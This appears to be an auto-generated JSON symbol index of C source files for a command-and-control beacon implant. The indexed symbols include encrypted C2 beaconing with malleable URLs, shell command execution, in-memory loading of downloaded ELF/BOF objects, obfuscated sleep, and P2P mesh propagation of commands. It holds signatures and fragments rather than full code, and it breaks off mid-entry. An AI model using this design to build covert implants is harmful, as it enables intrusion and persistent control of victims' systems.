mesh_add_peer(const char *ip, int port)"}, {"kind": "function", "line": 1094, "name": "mesh_cleanup_peers", "signature": "void mesh_cleanup_peers()"}, {"doc": "========== PROPAGACIÓN MESH ==========", "kind": "function", "line": 1108, "name": "mesh_send_to_peer", "signature": "int mesh_send_to_peer(const char *ip, int port, const mesh_msg_t *msg)"}, {"kind": "function", "line": 1130, "name": "mesh_propagate", "signature": "void mesh_propagate(const char *command)"}, {"doc": "========== DISCOVERY THREAD ==========", "kind": "function", "line": 1157, "name": "mesh_discovery_thread", "signature": "void *mesh_discovery_thread(void *arg)"}, {"doc": "========== MESH LISTENER THREAD ==========", "kind": "function", "line": 1240, "name": "mesh_listener_thread", "signature": "void *mesh_listener_thread(void *arg)"}, {"kind": "function", "line": 1416, "name": "mesh_send_message", "signature": "void mesh_send_message(int type, const char* target, const char* payload)"}, {"doc": "=== MAIN ===", "kind": "function", "line": 1444, "name": "main", "signature": "int main(int argc, char **argv)"}, {"doc": "=== TIPOS Y SÍMBOLOS FALTANTES ===", "kind": "function", "line": 104, "name": "void", "signature": "typedef void (*bof_func_t)(char*, int);"}, {"doc": "CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el push del return address) Entonces necesitamos RSP % 16 == 8 justo antes del call", "kind": "function", "line": 188, "name": "volatile", "signature": "asm volatile( // Guardar frame pointer \"push %%rbp\\n\\t\" \"mov %%rsp, %%rbp\\n\\t\" // Guardar callee-saved registers \"push %%rbx\\n\\t\" \"push %%r12\\n\\t\" \"push %%r13\\n\\t\" \"push %%r14\\n\\t\" \"push %%r15\\n\\t\" //"}, {"kind": "function", "line": 238, "name": "va_start", "signature": "va_start(args, fmt);"}, {"kind": "function", "line": 242, "name": "va_end", "signature": "va_end(args);"}, {"kind": "function", "line": 253, "name": "memcpy", "signature": "memcpy(g_beacon_output + g_output_len, data, len);"}, {"kind": "function", "line": 266, "name": "fprintf", "signature": "fprintf(stderr, \"[!] Trampolín: mmap falló\\n\");"}, {"kind": "function", "line": 282, "name": "munmap", "signature": "munmap(code, code_size);"}, {"kind": "function", "line": 299, "name": "free", "signature": "free(g_trampolines);"}, {"kind": "function", "line": 363, "name": "fflush", "signature": "fflush(stderr);"}, {"kind": "function", "line": 377, "name": "curl_easy_setopt", "signature": "curl_easy_setopt(curl, CURLOPT_URL, url);"}, {"kind": "function", "line": 422, "name": "curl_easy_cleanup", "signature": "curl_easy_cleanup(curl);"}, {"kind": "function", "line": 454, "name": "BIO_set_flags", "signature": "BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);"}, {"kind": "function", "line": 455, "name": "BIO_write", "signature": "BIO_write(b64, input, len);"}, {"kind": "function", "line": 456, "name": "BIO_flush", "signature": "BIO_flush(b64);"}, {"kind": "function", "line": 457, "name": "BIO_get_mem_ptr", "signature": "BIO_get_mem_ptr(b64, &bptr);"}, {"kind": "function", "line": 461, "name": "BIO_free_all", "signature": "BIO_free_all(b64);"}, {"kind": "function", "line": 491, "name": "AES_init_ctx", "signature": "AES_init_ctx(&ctx, key);"}, {"kind": "function", "line": 499, "name": "AES_ECB_encrypt", "signature": "AES_ECB_encrypt(&ctx, encrypted_iv);"}, {"kind": "function", "line": 508, "name": "memset", "signature": "memset(iv_buf + block_size, 0, 16 - block_size);"}, {"kind": "function", "line": 551, "name": "pclose", "signature": "pclose(fp);"}, {"kind": "function", "line": 743, "name": "perror", "signature": "perror(\"calloc\");"}, {"kind": "function", "line": 939, "name": "call_bof_isolated", "signature": "call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);"}, {"kind": "function", "line": 962, "name": "close", "signature": "close(sockfd);"}, {"kind": "function", "line": 963, "name": "strdup", "signature": "return strdup(\"127.0.0.1\");"}, {"kind": "function", "line": 973, "name": "inet_ntop", "signature": "inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);"}, {"kind": "function", "line": 975, "name": "strcat", "signature": "strcat(result, ip);"}, {"kind": "function", "line": 979, "name": "strlen", "signature": "return strlen(result) > 0 ? result : strdup(\"127.0.0.1\");"}, {"kind": "function", "line": 994, "name": "printf", "signature": "printf(\"[DEBUG] download_bof: descargados %zu bytes\\n\", *out_size);"}, {"kind": "function", "line": 1051, "name": "pthread_mutex_lock", "signature": "pthread_mutex_lock(&g_mesh.seen_mutex);"}, {"kind": "function", "line": 1053, "name": "strncpy", "signature": "strncpy(g_mesh.seen_msgs[idx], msg_id, 63);"}, {"kind": "function", "line": 1055, "name": "pthread_mutex_unlock", "signature": "pthread_mutex_unlock(&g_mesh.seen_mutex);"}, {"kind": "function", "line": 1113, "name": "setsockopt", "signature": "setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));"}, {"kind": "function", "line": 1117, "name": "inet_pton", "signature": "inet_pton(AF_INET, ip, &addr.sin_addr);"}, {"kind": "function", "line": 1126, "name": "send", "signature": "send(sock, buffer, len, 0);"}, {"kind": "function", "line": 1134, "name": "snprintf", "signature": "snprintf(msg.msg_id, sizeof(msg.msg_id), \"%lx-%lx\", (unsigned long)time(NULL), (unsigned long)rand());"}, {"kind": "function", "line": 1188, "name": "FD_ZERO", "signature": "FD_ZERO(&readfds);"}, {"kind": "function", "line": 1190, "name": "FD_SET", "signature": "FD_SET(sock, &readfds);"}, {"kind": "function", "line": 1200, "name": "sendto", "signature": "sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&bcast, sizeof(bcast));"}, {"kind": "function", "line": 1257, "name": "listen", "signature": "listen(server_sock, 10);"}, {"kind": "function", "line": 1460, "name": "pthread_mutex_init", "signature": "pthread_mutex_init(&g_mesh.peers_mutex, NULL);"}, {"kind": "function", "line": 1468, "name": "pthread_detach", "signature": "pthread_detach(tid_discovery);"}, {"kind": "function", "line": 1473, "name": "srand", "signature": "srand(time(NULL));"}, {"kind": "function", "line": 1477, "name": "sscanf", "signature": "sscanf(KEY_HEX + i * 2, \"%2hhx\", &AES_KEY[i]);"}, {"kind": "function", "line": 1494, "name": "sleep", "signature": "sleep(6);"}, {"kind": "function", "line": 1591, "name": "gethostname", "signature": "gethostname(hostname, sizeof(hostname) - 1);"}, {"kind": "function", "line": 1599, "name": "cJSON_AddStringToObject", "signature": "cJSON_AddStringToObject(root, \"output\", output);"}, {"kind": "function", "line": 1602, "name": "cJSON_AddNumberToObject", "signature": "cJSON_AddNumberToObject(root, \"pid\", (double)getpid());"}, {"kind": "function", "line": 1607, "name": "cJSON_AddNullToObject", "signature": "cJSON_AddNullToObject(root, \"result_portscan\");"}, {"kind": "function", "line": 1611, "name": "cJSON_Delete", "signature": "cJSON_Delete(root);"}, {"kind": "function", "line": 1627, "name": "RAND_bytes", "signature": "RAND_bytes(iv_out, 16);"}, {"kind": "macro", "line": 1, "name": "_GNU_SOURCE", "signature": "#define _GNU_SOURCE"}, {"kind": "macro", "line": 35, "name": "MAX_PEERS", "signature": "#define MAX_PEERS"}, {"kind": "macro", "line": 38, "name": "DISCOVERY_PORT", "signature": "#define DISCOVERY_PORT"}, {"kind": "macro", "line": 39, "name": "DISCOVERY_INTERVAL", "signature": "#define DISCOVERY_INTERVAL"}, {"kind": "macro", "line": 40, "name": "MAX_TTL", "signature": "#define MAX_TTL"}, {"kind": "macro", "line": 41, "name": "MESH_MSG_SIZE", "signature": "#define MESH_MSG_SIZE"}, {"kind": "macro", "line": 42, "name": "C2_URL", "signature": "#define C2_URL"}, {"kind": "macro", "line": 45, "name": "CLIENT_ID", "signature": "#define CLIENT_ID"}, {"kind": "macro", "line": 46, "name": "MALEABLE", "signature": "#define MALEABLE"}, {"kind": "macro", "line": 47, "name": "USER_AGENTS_COUNT", "signature": "#define USER_AGENTS_COUNT"}]}, {"doc": "define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <sys/types.h> include <sys/socket.h> include <netinet/in.h> include <arpa/inet.h> include <net/if.h> include <sys/ioctl.h> include <pwd.h> include <errno.h> include <openssl/buffer.h> include <curl/curl.h> include <openssl/rand.h> include <openssl/bio.h> include <openssl/evp.h> include <sys/mman.h> include <elf.h> include <dlfcn.h> include <fcntl.h> include <stdint.h> include <sys/wait.h> include <stdarg.h> include <netdb.h> include <poll.h>", "id": "beacon6.c", "kind": "module", "label": "beacon6.c", "language": "c", "sha256": "23de7e20a571d06b", "symbol_count": 70, "symbols": [{"doc": "=== ESTRUCTURAS ===", "kind": "struct", "line": 52, "name": "MemoryStruct"}, {"doc": "=== TRAMPOLINES ===", "kind": "struct", "line": 59, "name": "Trampoline"}, {"kind": "struct", "line": 67, "name": "SymbolResolver"}, {"doc": "=== CACHE DE TRAMPOLINES ===", "kind": "struct", "line": 73, "name": "TrampolineCache"}, {"kind": "function", "line": 142, "name": "__attribute__", "signature": "static void __attribute__((noinline))\ncall_bof_isolated(bof_func_t func, char* args, uintptr_t ar..."}, {"doc": "sleep ofuscated using poll", "kind": "function", "line": 195, "name": "delay_ms", "signature": "static void delay_ms(int ms)"}, {"doc": "-- Lógica de números primos (sin cambios esenciales) ---", "kind": "function", "line": 202, "name": "is_prime", "signature": "static unsigned int is_prime(unsigned int x)"}, {"doc": "if (x < 2) return 0; if (x == 2) return 1; if ((x & 1) == 0) return 0; /* even > 2 unsigned int d = 3; while (d * d <= x) { if (x % d == 0) return 0; d += 2; } return 1; } /* Returns the n-th prime (1-indexed). Returns 0 if n <= 0.", "kind": "function", "line": 218, "name": "get_nth_prime_limited", "signature": "static unsigned int get_nth_prime_limited(unsigned int n)"}, {"kind": "function", "line": 242, "name": "portable_rand_19k_29k", "signature": "static unsigned int portable_rand_19k_29k(void)"}, {"doc": "=== BEACON API ===", "kind": "function", "line": 255, "name": "BeaconPrintf", "signature": "void BeaconPrintf(int type, const char *fmt, ...)"}, {"kind": "function", "line": 267, "name": "BeaconOutput", "signature": "void BeaconOutput(int type, const char *data, int len)"}, {"doc": "=== CRATE TRAPOLINE ===", "kind": "function", "line": 279, "name": "create_trampoline", "signature": "static void* create_trampoline(void* target)"}, {"doc": "=== CLEAN TRAMPOLINE ===", "kind": "function", "line": 315, "name": "cleanup_trampolines", "signature": "static void cleanup_trampolines(void)"}, {"kind": "function", "line": 330, "name": "get_or_create_trampoline", "signature": "static void* get_or_create_trampoline(void* target)"}, {"doc": "=== CURL WRITE CALLBACK ===", "kind": "function", "line": 362, "name": "WriteMemoryCallback", "signature": "static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)"}, {"doc": "=== HTTPS REQUEST ===", "kind": "function", "line": 379, "name": "https_request", "signature": "char* https_request(const char* url, const char* method, const char* post_data)"}, {"doc": "=== BASE64 ===", "kind": "function", "line": 468, "name": "base64_encode", "signature": "char* base64_encode(const unsigned char* input, int len)"}, {"kind": "function", "line": 484, "name": "base64_decode", "signature": "unsigned char* base64_decode(const char* input, int* len)"}, {"doc": "=== AES CFB ===", "kind": "function", "line": 508, "name": "aes256_cfb_encrypt", "signature": "unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,\n            ..."}, {"kind": "function", "line": 535, "name": "aes256_cfb_decrypt", "signature": "unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,\n            ..."}, {"doc": "=== EXEC CMD ===", "kind": "function", "line": 566, "name": "exec_cmd", "signature": "char* exec_cmd(const char* cmd, int* out_len)"}, {"doc": "=== Función auxiliar: alinear al tamaño de página ===", "kind": "function", "line": 587, "name": "page_align", "signature": "static size_t page_align(size_t size)"}, {"kind": "function", "line": 592, "name": "RunELF", "signature": "int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, \n           unsi..."}, {"doc": "=== GET LOCAL IPs ===", "kind": "function", "line": 974, "name": "get_local_ips", "signature": "char* get_local_ips()"}, {"doc": "=== DOWNLOAD BOF ===", "kind": "function", "line": 1003, "name": "download_bof", "signature": "unsigned char* download_bof(const char* url, size_t* out_size)"}, {"doc": "=== RUN BOF AND CAPTURE ===", "kind": "function", "line": 1025, "name": "run_bof_and_capture", "signature": "char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,\n                          c..."}, {"doc": "=== MAIN ===", "kind": "function", "line": 1069, "name": "main", "signature": "int main()"}, {"doc": "=== TIPOS Y SÍMBOLOS FALTANTES ===", "kind": "function", "line": 65, "name": "void", "signature": "typedef void (*bof_func_t)(char*, int);"}, {"doc": "CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el push del return address) Entonces necesitamos RSP % 16 == 8 justo antes del call", "kind": "function", "line": 148, "name": "volatile", "signature": "asm volatile( // Guardar frame pointer \"push %%rbp\\n\\t\" \"mov %%rsp, %%rbp\\n\\t\" // Guardar callee-saved registers \"push %%rbx\\n\\t\" \"push %%r12\\n\\t\" \"push %%r13\\n\\t\" \"push %%r14\\n\\t\" \"push %%r15\\n\\t\" //"}, {"kind": "function", "line": 197, "name": "poll", "signature": "poll(&p, 0, ms);"}, {"kind": "function", "line": 247, "name": "srand", "signature": "srand((unsigned int)time(NULL));"}, {"kind": "function", "line": 258, "name": "va_start", "signature": "va_start(args, fmt);"}, {"kind": "function", "line": 262, "name": "va_end", "signature": "va_end(args);"}, {"kind": "function", "line": 273, "name": "memcpy", "signature": "memcpy(g_beacon_output + g_output_len, data, len);"}, {"kind": "function", "line": 286, "name": "fprintf", "signature": "fprintf(stderr, \"[!] Trampolín: mmap falló\\n\");"}, {"kind": "function", "line": 302, "name": "munmap", "signature": "munmap(code, code_size);"}, {"kind": "function", "line": 319, "name": "free", "signature": "free(g_trampolines);"}, {"kind": "function", "line": 383, "name": "fflush", "signature": "fflush(stderr);"}, {"kind": "function", "line": 397, "name": "curl_easy_setopt", "signature": "curl_easy_setopt(curl, CURLOPT_URL, url);"}, {"kind": "function", "line": 442, "name": "curl_easy_cleanup", "signature": "curl_easy_cleanup(curl);"}, {"kind": "function", "line": 474, "name": "BIO_set_flags", "signature": "BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);"}, {"kind": "function", "line": 475, "name": "BIO_write", "signature": "BIO_write(b64, input, len);"}, {"kind": "function", "line": 476, "name": "BIO_flush", "signature": "BIO_flush(b64);"}, {"kind": "function", "line": 477, "name": "BIO_get_mem_ptr", "signature": "BIO_get_mem_ptr(b64, &bptr);"}, {"kind": "function", "line": 481, "name": "BIO_free_all", "signature": "BIO_free_all(b64);"}, {"kind": "function", "line": 511, "name": "AES_init_ctx", "signature": "AES_init_ctx(&ctx, key);"}, {"kind": "function", "line": 519, "name": "AES_ECB_encrypt", "signature": "AES_ECB_encrypt(&ctx, encrypted_iv);"}, {"kind": "function", "line": 528, "name": "memset", "signature": "memset(iv_buf + block_size, 0, 16 - block_size);"}, {"kind": "function", "line": 571, "name": "pclose", "signature": "pclose(fp);"}, {"kind": "function", "line": 763, "name": "perror", "signature": "perror(\"calloc\");"}, {"kind": "function", "line": 959, "name": "call_bof_isolated", "signature": "call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);"}, {"kind": "function", "line": 982, "name": "close", "signature": "close(sockfd);"}, {"kind": "function", "line": 983, "name": "strdup", "signature": "return strdup(\"127.0.0.1\");"}, {"kind": "function", "line": 993, "name": "inet_ntop", "signature": "inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);"}, {"kind": "function", "line": 995, "name": "strcat", "signature": "strcat(result, ip);"}, {"kind": "function", "line": 999, "name": "strlen", "signature": "return strlen(result) > 0 ? result : strdup(\"127.0.0.1\");"}, {"kind": "function", "line": 1014, "name": "printf", "signature": "printf(\"[DEBUG] download_bof: descargados %zu bytes\\n\", *out_size);"}, {"kind": "function", "line": 1075, "name": "sscanf", "signature": "sscanf(KEY_HEX + i * 2, \"%2hhx\", &AES_KEY[i]);"}, {"kind": "function", "line": 1082, "name": "snprintf", "signature": "snprintf(full_url, sizeof(full_url), \"%s%s%s\", C2_URL, MALEABLE, CLIENT_ID);"}, {"kind": "function", "line": 1191, "name": "gethostname", "signature": "gethostname(hostname, sizeof(hostname) - 1);"}, {"kind": "function", "line": 1199, "name": "cJSON_AddStringToObject", "signature": "cJSON_AddStringToObject(root, \"output\", output);"}, {"kind": "function", "line": 1202, "name": "cJSON_AddNumberToObject", "signature": "cJSON_AddNumberToObject(root, \"pid\", (double)getpid());"}, {"kind": "function", "line": 1207, "name": "cJSON_AddNullToObject", "signature": "cJSON_AddNullToObject(root, \"result_portscan\");"}, {"kind": "function", "line": 1211, "name": "cJSON_Delete", "signature": "cJSON_Delete(root);"}, {"kind": "function", "line": 1228, "name": "RAND_bytes", "signature": "RAND_bytes(iv_out, 16);"}, {"kind": "macro", "line": 1, "name": "_GNU_SOURCE", "signature": "#define _GNU_SOURCE"}, {"kind": "macro", "line": 34, "name": "C2_URL", "signature": "#define C2_URL"}, {"kind": "macro", "line": 36, "name": "CLIENT_ID", "signature": "#define CLIENT_ID"}, {"kind": "macro", "line": 37, "name": "MALEABLE", "signature": "#define MALEABLE"}, {"kind": "macro", "line": 38, "name": "USER_AGENTS_COUNT", "signature": "#define USER_AGENTS_COUNT"}]}, {"doc": "define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <sys/types.h> include <sys/socket.h> include <netinet/in.h> include <arpa/inet.h> include <net/if.h> include <sys/ioctl.h> include <pwd.h> include <errno.h> include <openssl/buffer.h> include <curl/curl.h> include <openssl/rand.h> include <openssl/bio.h> include <openssl/evp.h> include <sys/mman.h> include <elf.h> include <dlfcn.h> include <fcntl.h> include <stdint.h> include <sys/wait.h> include <stdarg.h> include <netdb.h> include <pthread.h>  include \"beacon.h\"", "id": "beacon_p2p.c", "kind": "module", "label": "beacon_p2p.c", "language": "c", "sha256": "bf313f40d950342d", "symbol_count": 95, "symbols": [{"doc": "======================================================================= FUNCIONES DE COMUNICACIÓN (HTTPS + BASE64 + AES) =======================================================================", "kind": "struct", "line": 549, "name": "MemoryStruct"}, {"doc": "======================================================================= ESTRUCTURAS P2P =======================================================================", "kind": "struct", "line": 59, "name": "peer_t"}, {"kind": "struct", "line": 72, "name": "p2p_header_t"}, {"doc": "======================================================================= TRAMPOLINES Y RELOCACIÓN (RunELF) - SIN CAMBIOS =======================================================================", "kind": "struct", "line": 155, "name": "Trampoline"}, {"kind": "struct", "line": 161, "name": "SymbolResolver"}, {"kind": "struct", "line": 170, "name": "TrampolineCache"}, {"doc": "======================================================================= FUNCIONES DE LA API DE BEACON (para BOFs) =======================================================================", "kind": "function", "line": 91, "name": "BeaconDataParse", "signature": "void BeaconDataParse(datap *parser, char *buffer, int size)"}, {"kind": "function", "line": 96, "name": "BeaconDataPtr", "signature": "char *BeaconDataPtr(datap *parser, int size)"}, {"kind": "function", "line": 104, "name": "BeaconDataInt", "signature": "int BeaconDataInt(datap *parser)"}, {"kind": "function", "line": 110, "name": "BeaconDataShort", "signature": "short BeaconDataShort(datap *parser)"}, {"kind": "function", "line": 116, "name": "BeaconDataLength", "signature": "int BeaconDataLength(datap *parser)"}, {"kind": "function", "line": 120, "name": "BeaconDataExtract", "signature": "char *BeaconDataExtract(datap *parser, int *size)"}, {"kind": "function", "line": 128, "name": "BeaconPrintf", "signature": "void BeaconPrintf(int type, const char *fmt, ...)"}, {"kind": "function", "line": 141, "name": "BeaconOutput", "signature": "void BeaconOutput(int type, const char *data, int len)"}, {"kind": "function", "line": 228, "name": "__attribute__", "signature": "static void __attribute__((noinline))\ncall_bof_isolated(bof_func_t func, char* args, uintptr_t ar..."}, {"kind": "function", "line": 258, "name": "create_trampoline", "signature": "static void* create_trampoline(void* target)"}, {"kind": "function", "line": 283, "name": "cleanup_trampolines", "signature": "static void cleanup_trampolines(void)"}, {"kind": "function", "line": 296, "name": "get_or_create_trampoline", "signature": "static void* get_or_create_trampoline(void* target)"}, {"kind": "function", "line": 317, "name": "page_align", "signature": "static size_t page_align(size_t size)"}, {"kind": "function", "line": 323, "name": "RunELF", "signature": "int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,\n           unsig..."}, {"kind": "function", "line": 554, "name": "WriteMemoryCallback", "signature": "static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)"}, {"kind": "function", "line": 574, "name": "https_request", "signature": "char* https_request(const char* url, const char* method, const char* post_data)"}, {"kind": "function", "line": 624, "name": "base64_encode", "signature": "char* base64_encode(const unsigned char* input, int len)"}, {"kind": "function", "line": 640, "name": "base64_decode", "signature": "unsigned char* base64_decode(const char* input, int* len)"}, {"kind": "function", "line": 653, "name": "aes256_cfb_encrypt", "signature": "unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,\n            ..."}, {"kind": "function", "line": 680, "name": "aes256_cfb_decrypt", "signature": "unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,\n            ..."}, {"doc": "======================================================================= UTILIDADES: ejecutar comandos shell, obtener IPs, etc. =======================================================================", "kind": "function", "line": 712, "name": "exec_cmd", "signature": "char* exec_cmd(const char* cmd, int* out_len)"}, {"kind": "function", "line": 728, "name": "get_local_ips", "signature": "char* get_local_ips()"}, {"kind": "function", "line": 756, "name": "download_bof", "signature": "unsigned char* download_bof(const char* url, size_t* out_size)"}, {"kind": "function", "line": 765, "name": "run_bof_and_capture", "signature": "char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,\n                          c..."}, {"doc": "======================================================================= FUNCIONES P2P =======================================================================", "kind": "function", "line": 783, "name": "add_peer", "signature": "void add_peer(struct in_addr ip, int port, const char *id)"}, {"kind": "function", "line": 806, "name": "peer_discovery_thread", "signature": "void *peer_discovery_thread(void *arg)"}, {"kind": "function", "line": 845, "name": "handle_peer_connection", "signature": "void *handle_peer_connection(void *arg)"}, {"kind": "function", "line": 915, "name": "peer_server_thread", "signature": "void *peer_server_thread(void *arg)"}, {"kind": "function", "line": 934, "name": "send_to_peer", "signature": "char* send_to_peer(peer_t *peer, const char *data, int *out_len)"}, {"kind": "function", "line": 967, "name": "send_to_c2_or_peer", "signature": "char* send_to_c2_or_peer(const char *url, const char *method, const char *data, int *out_len)"}, {"doc": "======================================================================= EJECUTOR DE COMANDOS (unificado para shell y BOF) =======================================================================", "kind": "function", "line": 996, "name": "execute_generic_command", "signature": "char* execute_generic_command(const char *cmd, int *out_len)"}, {"doc": "======================================================================= MAIN =======================================================================", "kind": "function", "line": 1031, "name": "main", "signature": "int main()"}, {"kind": "function", "line": 132, "name": "va_start", "signature": "va_start(args, fmt);"}, {"kind": "function", "line": 136, "name": "va_end", "signature": "va_end(args);"}, {"kind": "function", "line": 147, "name": "memcpy", "signature": "memcpy(g_beacon_output + g_output_len, data, len);"}, {"kind": "function", "line": 159, "name": "void", "signature": "typedef void (*bof_func_t)(char*, int);"}, {"kind": "function", "line": 231, "name": "volatile", "signature": "asm volatile( \"push %%rbp\\n\\t\" \"mov %%rsp, %%rbp\\n\\t\" \"push %%rbx\\n\\t\" \"push %%r12\\n\\t\" \"push %%r13\\n\\t\" \"push %%r14\\n\\t\" \"push %%r15\\n\\t\" \"sub $8, %%rsp\\n\\t\" \"mov %0, %%rdi\\n\\t\" \"mov %1, %%rsi\\n\\t\" \""}, {"kind": "function", "line": 286, "name": "munmap", "signature": "munmap(g_trampolines[i].addr, g_trampolines[i].size);"}, {"kind": "function", "line": 287, "name": "free", "signature": "free(g_trampolines);"}, {"kind": "function", "line": 534, "name": "call_bof_isolated", "signature": "call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);"}, {"kind": "function", "line": 579, "name": "curl_easy_setopt", "signature": "curl_easy_setopt(curl, CURLOPT_URL, url);"}, {"kind": "function", "line": 606, "name": "curl_easy_cleanup", "signature": "curl_easy_cleanup(curl);"}, {"kind": "function", "line": 629, "name": "BIO_set_flags", "signature": "BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);"}, {"kind": "function", "line": 630, "name": "BIO_write", "signature": "BIO_write(b64, input, len);"}, {"kind": "function", "line": 631, "name": "BIO_flush", "signature": "BIO_flush(b64);"}, {"kind": "function", "line": 633, "name": "BIO_get_mem_ptr", "signature": "BIO_get_mem_ptr(b64, &bptr);"}, {"kind": "function", "line": 637, "name": "BIO_free_all", "signature": "BIO_free_all(b64);"}, {"kind": "function", "line": 657, "name": "AES_init_ctx", "signature": "AES_init_ctx(&ctx, key);"}, {"kind": "function", "line": 665, "name": "AES_ECB_encrypt", "signature": "AES_ECB_encrypt(&ctx, encrypted_iv);"}, {"kind": "function", "line": 673, "name": "memset", "signature": "memset(iv_buf + block_size, 0, 16 - block_size);"}, {"kind": "function", "line": 723, "name": "pclose", "signature": "pclose(fp);"}, {"kind": "function", "line": 737, "name": "close", "signature": "close(sockfd);"}, {"kind": "function", "line": 738, "name": "strdup", "signature": "return strdup(\"127.0.0.1\");"}, {"kind": "function", "line": 748, "name": "inet_ntop", "signature": "inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);"}, {"kind": "function", "line": 750, "name": "strcat", "signature": "strcat(result, ip);"}, {"kind": "function", "line": 754, "name": "strlen", "signature": "return strlen(result) > 0 ? result : strdup(\"127.0.0.1\");"}, {"kind": "function", "line": 784, "name": "pthread_mutex_lock", "signature": "pthread_mutex_lock(&g_peer_lock);"}, {"kind": "function", "line": 789, "name": "pthread_mutex_unlock", "signature": "pthread_mutex_unlock(&g_peer_lock);"}, {"kind": "function", "line": 800, "name": "strncpy", "signature": "strncpy(g_peers[g_peer_count].id, id, sizeof(g_peers[g_peer_count].id)-1);"}, {"kind": "function", "line": 810, "name": "setsockopt", "signature": "setsockopt(udp_sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));"}, {"kind": "function", "line": 817, "name": "gethostname", "signature": "gethostname(my_id, sizeof(my_id)-1);"}, {"kind": "function", "line": 818, "name": "snprintf", "signature": "snprintf(my_id + strlen(my_id), sizeof(my_id)-strlen(my_id), \":%d\", getpid());"}, {"kind": "function", "line": 825, "name": "bind", "signature": "bind(udp_sock, (struct sockaddr*)&listen_addr, sizeof(listen_addr));"}, {"kind": "function", "line": 828, "name": "sendto", "signature": "sendto(udp_sock, my_id, strlen(my_id), 0, (struct sockaddr*)&bc_addr, sizeof(bc_addr));"}, {"kind": "function", "line": 838, "name": "sleep", "signature": "sleep(BROADCAST_INTERVAL);"}, {"kind": "function", "line": 864, "name": "write", "signature": "write(fd, &resp_hdr, sizeof(resp_hdr));"}, {"kind": "function", "line": 871, "name": "RAND_bytes", "signature": "RAND_bytes(iv_out, 16);"}, {"kind": "function", "line": 922, "name": "listen", "signature": "listen(listen_fd, 10);"}, {"kind": "function", "line": 929, "name": "pthread_create", "signature": "pthread_create(&tid, NULL, handle_peer_connection, (void*)(intptr_t)client_fd);"}, {"kind": "function", "line": 930, "name": "pthread_detach", "signature": "pthread_detach(tid);"}, {"kind": "function", "line": 959, "name": "read", "signature": "read(peer->fd, cipher, resp_hdr.payload_len);"}, {"kind": "function", "line": 1032, "name": "printf", "signature": "printf(\"[*] Beacon P2P starting...\\n\");"}, {"kind": "function", "line": 1033, "name": "srand", "signature": "srand(time(NULL));"}, {"kind": "function", "line": 1037, "name": "sscanf", "signature": "sscanf(KEY_HEX + i * 2, \"%2hhx\", &AES_KEY[i]);"}, {"kind": "function", "line": 1097, "name": "cJSON_AddStringToObject", "signature": "cJSON_AddStringToObject(root, \"output\", output);"}, {"kind": "function", "line": 1100, "name": "cJSON_AddNumberToObject", "signature": "cJSON_AddNumberToObject(root, \"pid\", (double)getpid());"}, {"kind": "function", "line": 1105, "name": "cJSON_AddNullToObject", "signature": "cJSON_AddNullToObject(root, \"result_portscan\");"}, {"kind": "function", "line": 1108, "name": "cJSON_Delete", "signature": "cJSON_Delete(root);"}, {"kind": "macro", "line": 1, "name": "_GNU_SOURCE", "signature": "#define _GNU_SOURCE"}, {"kind": "macro", "line": 37, "name": "C2_URL", "signature": "#define C2_URL"}, {"kind": "macro", "line": 38, "name": "CLIENT_ID", "signature": "#define CLIENT_ID"}, {"kind": "macro", "line": 39, "name": "MALEABLE", "signature": "#define MALEABLE"}, {"kind": "macro", "line": 40, "name": "USER_AGENTS_COUNT", "signature": "#define USER_AGENTS_COUNT"}, {"kind": "macro", "line": 41, "name": "PEER_DISCOVERY_PORT", "signature": "#define PEER_DISCOVERY_PORT"}, {"kind": "macro", "line": 43, "name": "PEER_TCP_PORT", "signature": "#define PEER_TCP_PORT"}, {"kind": "macro", "line": 44, "name": "PEER_MAGIC", "signature": "#define PEER_MAGIC"}, {"kind": "macro", "line": 45, "name": "PEER_VERSION", "signature": "#define PEER_VERSION"}, {"kind": "macro", "line": 46, "name": "BROADCAST_INTERVAL", "signature": "#define BROADCAST_INTERVAL"}, {"kind": "macro", "line": 47, "name": "MAX_PEERS", "signature": "#define MAX_PEERS"}]}, {"id": "beacons/v1/beacon.c", "kind": "module", "label": "beacon.c", "language": "c", "sha256": "5f55ea449d76bd8a", "symbol_count": 19, "symbols": [{"doc": "This beacon uses exponential backoff on failures to reduce noise when the C2 is unreachable. The backoff resets on the first successful command exchange.  define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <pwd.h> include <openssl/rand.h> include \"beacon_common.h\" include \"cJSON.h\"", "kind": "function", "line": 23, "name": "report_result", "signature": "static void report_result(const bsb_config_t *cfg,\n                           const char *command..."}, {"kind": "function", "line": 96, "name": "execute_command", "signature": "static char *execute_command(const bsb_config_t *cfg, const char *command)"}, {"kind": "function", "line": 145, "name": "main", "signature": "int main(void)"}, {"kind": "function", "line": 28, "name": "gethostname", "signature": "gethostname(hostname, sizeof(hostname) - 1);"}, {"kind": 